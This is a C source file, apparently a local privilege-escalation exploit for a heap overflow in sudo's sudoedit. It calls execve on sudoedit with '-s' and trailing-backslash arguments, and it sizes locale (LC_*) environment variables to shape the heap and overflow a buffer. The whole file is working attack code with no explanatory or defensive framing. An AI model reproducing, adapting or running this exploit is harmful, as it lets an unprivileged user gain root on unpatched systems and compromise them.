#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<math.h>

#define __LC_CTYPE		 0
#define __LC_NUMERIC		 1
#define __LC_TIME		 2
#define __LC_COLLATE		 3
#define __LC_MONETARY		 4
#define __LC_MESSAGES		 5
#define __LC_ALL		 6
#define __LC_PAPER		 7
#define __LC_NAME		 8
#define __LC_ADDRESS		 9
#define __LC_TELEPHONE		10
#define __LC_MEASUREMENT	11
#define __LC_IDENTIFICATION	12

char * envName[13]={"LC_CTYPE","LC_NUMERIC","LC_TIME","LC_COLLATE","LC_MONETARY","LC_MESSAGES","LC_ALL","LC_PAPER","LC_NAME","LC_ADDRESS","LC_TELEPHONE","LC_MEASUREMENT","LC_IDENTIFICATION"};

int now=13;
int envnow=0;
int argvnow=0;
char * envp[0x300];
char * argv[0x300];
char * addChunk(int size)
{
    now --;
    char * result;
    if(now ==6)
    {
        now --;
    }
    if(now>=0)
    {
        result=malloc(size+0x20);
        strcpy(result,envName[now]);
        strcat(result,"=C.UTF-8@");
        for(int i=9;i<=size-0x17;i++)
            strcat(result,"A");
        envp[envnow++]=result;
    }
    return result;
}

void final()
{
    now --;
    char * result;
    if(now ==6)
    {
        now --;
    }
    if(now>=0)
    {
        result=malloc(0x100);
        strcpy(result,envName[now]);
        strcat(result,"=xxxxxxxxxxxxxxxxxxxxx");
        envp[envnow++]=result;
    }
}

int setargv(int size,int offset)
{
    size-=0x10;
    signed int x,y;
    signed int a=-3;
    signed int b=2*size-3;
    signed int c=2*size-2-offset*2;
    signed int tmp=b*b-4*a*c;
    if(tmp<0)
        return -1;
    tmp=(signed int)sqrt((double)tmp*1.0);
    signed int A=(0-b+tmp)/(2*a);
    signed int B=(0-b-tmp)/(2*a);
    if(A<0 && B<0)
        return -1;
    if((A>0 && B<0) || (A<0 && B>0))
        x=(A>0) ? A: B;
    if(A>0 && B > 0)
        x=(A<B) ? A : B;
    y=size-1-x*2;
    int len=x+y+(x+y+y+1)*x/2;

    while ((signed int)(offset-len)<2)
    {
        x--;
        y=size-1-x*2;
        len=x+y+(x+y+1)*x/2;
        if(x<0)
            return -1;
    }
    int envoff=offset-len-2+0x30;
    printf("%d,%d,%d\n",x,y,len);
    char * Astring=malloc(size);
    int i=0;
    for(i=0;i<y;i++)
        Astring[i]='A';
    Astring[i]='\x00';

    argv[argvnow++]="sudoedit";
    argv[argvnow++]="-s";
    for (i=0;i<x;i++)
        argv[argvnow++]="\\";
    argv[argvnow++]=Astring;
    argv[argvnow++]="\\";
    argv[argvnow++]=NULL;
    for(i=0;i<envoff;i++)
        envp[envnow++]="\\";
    envp[envnow++]="X/test";
    return 0;
}

int main()
{
    setargv(0xa0,0x650);
    addChunk(0x40);
    addChunk(0x40);
    addChunk(0xa0);
    addChunk(0x40);
    final();

    execve("/usr/local/bin/sudoedit",argv,envp);
}
